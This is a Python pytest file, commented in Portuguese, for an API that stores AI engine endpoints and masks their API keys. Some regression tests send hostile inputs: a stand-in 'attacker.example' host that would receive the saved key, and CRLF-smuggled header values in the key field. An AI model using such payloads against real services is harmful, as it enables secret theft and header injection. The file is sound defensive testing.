"""Borda HTTP dos motores: o segredo entra mas não sai, e encostar no campo não apaga a key.

Essa segunda parte já mordeu uma vez no ConfigSheet (commit 22ae599): o cliente recebe a chave
MASCARADA, e se o PUT tratar essa máscara como valor novo, a key real morre sem volta.
"""
import json

import pytest
from fastapi.testclient import TestClient
from unittest.mock import patch

from app import engines as eng
from app import tmux
from app.api import app
from app.config import settings
from app.models import SessionInfo

TOKEN = "secret-de-teste"
AUTH = {"Authorization": f"Bearer {TOKEN}"}


@pytest.fixture(autouse=True)
def _isola(tmp_path, monkeypatch):
    monkeypatch.setattr(eng, "caminho", lambda: tmp_path / "engines.json")
    # Convenção da casa (ver tests/test_runner_api.py): token real + header Bearer. Deixar o token
    # vazio NÃO libera o require_auth — verificado, continua 401.
    monkeypatch.setattr(settings, "auth_token", TOKEN)
    yield


@pytest.fixture
def cli():
    return TestClient(app)


def _kimi() -> dict:
    return {
        "label": "Kimi Code · K3",
        "base_url": "https://api.kimi.com/coding",
        "api_key": "sk-kimi-abcdefgh1234",
        "model": "k3",
    }


def test_get_vazio(cli):
    r = cli.get("/api/engines", headers=AUTH)
    assert r.status_code == 200
    assert r.json()["motores"] == {}


def test_sem_token_e_401(cli):
    assert cli.get("/api/engines").status_code == 401


def test_put_grava_e_get_devolve_mascarado(cli):
    assert cli.put("/api/engines/kimi", json=_kimi(), headers=AUTH).status_code == 200
    motor = cli.get("/api/engines", headers=AUTH).json()["motores"]["kimi"]
    assert motor["api_key"] != "sk-kimi-abcdefgh1234"
    assert motor["api_key"].startswith("sk-k")
    assert motor["api_key"].endswith("1234")
    assert motor["api_key_definida"] is True
    assert eng.listar()["kimi"]["api_key"] == "sk-kimi-abcdefgh1234"


def test_put_sem_key_preserva_a_atual(cli):
    cli.put("/api/engines/kimi", json=_kimi(), headers=AUTH)
    d = _kimi()
    del d["api_key"]
    d["model"] = "kimi-for-coding"
    assert cli.put("/api/engines/kimi", json=d, headers=AUTH).status_code == 200
    salvo = eng.listar()["kimi"]
    assert salvo["api_key"] == "sk-kimi-abcdefgh1234"
    assert salvo["model"] == "kimi-for-coding"


def test_put_com_a_mascara_de_volta_preserva_a_atual(cli):
    from app.runtime_config import mascarar
    cli.put("/api/engines/kimi", json=_kimi(), headers=AUTH)
    d = _kimi()
    d["api_key"] = mascarar("sk-kimi-abcdefgh1234")
    assert cli.put("/api/engines/kimi", json=d, headers=AUTH).status_code == 200
    assert eng.listar()["kimi"]["api_key"] == "sk-kimi-abcdefgh1234"


def test_put_invalido_volta_400_com_a_mensagem(cli):
    d = _kimi()
    d["base_url"] = "http://api.kimi.com/coding"
    r = cli.put("/api/engines/kimi", json=d, headers=AUTH)
    assert r.status_code == 400
    assert "https" in r.json()["detail"]


def test_put_de_motor_novo_sem_key_e_400(cli):
    d = _kimi()
    del d["api_key"]
    r = cli.put("/api/engines/kimi", json=d, headers=AUTH)
    assert r.status_code == 400
    assert "api_key" in r.json()["detail"]


def test_delete_remove_e_404_no_inexistente(cli):
    cli.put("/api/engines/kimi", json=_kimi(), headers=AUTH)
    assert cli.delete("/api/engines/kimi", headers=AUTH).status_code == 200
    assert eng.listar() == {}
    assert cli.delete("/api/engines/kimi", headers=AUTH).status_code == 404


def test_modelos_usa_a_key_gravada_quando_o_cliente_manda_so_o_nome(cli, monkeypatch):
    # O cliente NUNCA tem a key inteira (ela volta mascarada), então "Testar" num motor já salvo
    # precisa reusar a do disco.
    cli.put("/api/engines/kimi", json=_kimi(), headers=AUTH)
    vistos = {}

    def _fake(base_url, api_key):
        vistos["base_url"] = base_url
        vistos["api_key"] = api_key
        return [{"id": "k3", "context_length": 262144, "vision": True}]

    monkeypatch.setattr("app.engine_probe.listar_modelos", _fake)
    r = cli.post("/api/engines/modelos", json={"nome": "kimi"}, headers=AUTH)
    assert r.status_code == 200
    assert r.json()["modelos"][0]["id"] == "k3"
    assert vistos["api_key"] == "sk-kimi-abcdefgh1234"
    assert vistos["base_url"] == "https://api.kimi.com/coding"


def test_modelos_com_falha_do_provedor_volta_502_com_a_mensagem(cli, monkeypatch):
    # Key errada é o cenário mais provável do primeiro uso. O erro do provedor tem que CHEGAR na
    # tela — sem isso o usuário só vê "não respondeu".
    def _explode(base_url, api_key):
        raise RuntimeError("401 Invalid Authentication")

    monkeypatch.setattr("app.engine_probe.listar_modelos", _explode)
    r = cli.post("/api/engines/modelos",
                 json={"base_url": "https://api.kimi.com/coding", "api_key": "sk-errada"},
                 headers=AUTH)
    assert r.status_code == 502
    assert "Invalid Authentication" in r.json()["detail"]


def test_modelos_recusa_base_url_insegura(cli):
    r = cli.post("/api/engines/modelos",
                 json={"base_url": "http://exemplo.com", "api_key": "sk-x"}, headers=AUTH)
    assert r.status_code == 400
    assert "https" in r.json()["detail"]


def test_modelos_recusa_nome_junto_com_base_url_de_terceiro(cli, monkeypatch):
    # O achado da review: sem esta recusa, {"nome":"kimi","base_url":"https://attacker.example"}
    # mandava a api_key REAL do kimi (salva no disco) no header Authorization para o host do
    # atacante — exfiltração de segredo, não o SSRF cego já aceito no modelo de ameaça do app.
    cli.put("/api/engines/kimi", json=_kimi(), headers=AUTH)
    vistos = {}
    monkeypatch.setattr("app.engine_probe.listar_modelos",
                         lambda base_url, api_key: vistos.update(base_url=base_url, api_key=api_key) or [])
    r = cli.post("/api/engines/modelos",
                 json={"nome": "kimi", "base_url": "https://attacker.example"}, headers=AUTH)
    assert r.status_code == 400
    assert "nome" in r.json()["detail"]
    assert vistos == {}  # o provedor nunca foi chamado — nem com o host certo, nem com o errado


def test_modelos_recusa_nome_junto_com_api_key_de_terceiro(cli):
    cli.put("/api/engines/kimi", json=_kimi(), headers=AUTH)
    r = cli.post("/api/engines/modelos",
                 json={"nome": "kimi", "api_key": "sk-outra-coisa"}, headers=AUTH)
    assert r.status_code == 400
    assert "nome" in r.json()["detail"]


# ---------------------------------------------------------------------------
# Task 5, item 5 do review: as validações de `engine` em POST /api/sessions e
# POST /api/archive/.../resume só tinham cobertura por curl manual — cobrindo aqui.
# ---------------------------------------------------------------------------

def test_create_sessao_com_motor_desconhecido_e_400(cli):
    r = cli.post("/api/sessions", json={"name": "x", "cwd": "/tmp", "engine": "fantasma"}, headers=AUTH)
    assert r.status_code == 400
    assert "motor" in r.json()["detail"]


def test_create_sessao_com_motor_e_provider_codex_e_400(cli):
    cli.put("/api/engines/kimi", json=_kimi(), headers=AUTH)
    r = cli.post("/api/sessions",
                 json={"name": "x", "cwd": "/tmp", "provider": "codex", "engine": "kimi"}, headers=AUTH)
    assert r.status_code == 400
    assert "provider" in r.json()["detail"]


def test_create_sessao_com_motor_valido_repassa_a_keyword(cli):
    cli.put("/api/engines/kimi", json=_kimi(), headers=AUTH)
    with patch("app.api.registry.create",
              return_value=SessionInfo(name="x", cwd="/tmp", engine="kimi")) as cr:
        r = cli.post("/api/sessions", json={"name": "x", "cwd": "/tmp", "engine": "kimi"}, headers=AUTH)
    assert r.status_code == 200
    cr.assert_called_once_with("x", "/tmp", None, provider="claude", engine="kimi")


# ---------------------------------------------------------------------------
# Fix wave (pré-push), item 3: a key nunca pode chegar no corpo de um erro nem no log do servidor.
# Reproduz os DOIS caminhos que o security reviewer achou: chave colada com CRLF (probe ad-hoc) e
# chave SALVA hand-editada com CRLF (via {"nome": ...}, que lê do disco sem a revalidação do env_de).
# ---------------------------------------------------------------------------

def test_modelos_recusa_key_com_crlf_sem_ecoar_a_chave(cli):
    r = cli.post("/api/engines/modelos",
                 json={"base_url": "https://api.kimi.com/coding", "api_key": "sk-secreta\r\nX-Evil: 1"},
                 headers=AUTH)
    assert r.status_code == 400
    assert "sk-secreta" not in r.text


def test_modelos_recusa_key_salva_com_crlf_hand_editada(cli):
    cli.put("/api/engines/kimi", json=_kimi(), headers=AUTH)
    bruto = json.loads(eng.caminho().read_text(encoding="utf-8"))
    bruto["kimi"]["api_key"] = "sk-kimi-abcdefgh1234\r\nX-Evil: 1"
    eng.caminho().write_text(json.dumps(bruto), encoding="utf-8")
    r = cli.post("/api/engines/modelos", json={"nome": "kimi"}, headers=AUTH)
    assert r.status_code == 400
    assert "sk-kimi-abcdefgh1234" not in r.text


_SID = "11111111-1111-1111-1111-111111111111"


def test_resume_arquivo_com_motor_desconhecido_e_400(cli):
    with patch("app.api.archive_cwd", return_value="/home/u/proj"):
        r = cli.post(f"/api/archive/proj/{_SID}/resume", json={"engine": "fantasma"}, headers=AUTH)
    assert r.status_code == 400
    assert "motor" in r.json()["detail"]


def test_resume_arquivo_com_motor_valido_repassa(cli):
    cli.put("/api/engines/kimi", json=_kimi(), headers=AUTH)
    with patch("app.api.archive_cwd", return_value="/home/u/proj"), \
         patch.object(tmux, "has_session", return_value=False), \
         patch("app.api.registry.create",
              return_value=SessionInfo(name="proj", cwd="/home/u/proj", engine="kimi")) as cr:
        r = cli.post(f"/api/archive/proj/{_SID}/resume", json={"engine": "kimi"}, headers=AUTH)
    assert r.status_code == 200
    cr.assert_called_once_with("proj", "/home/u/proj", resume_session_id=_SID, engine="kimi")
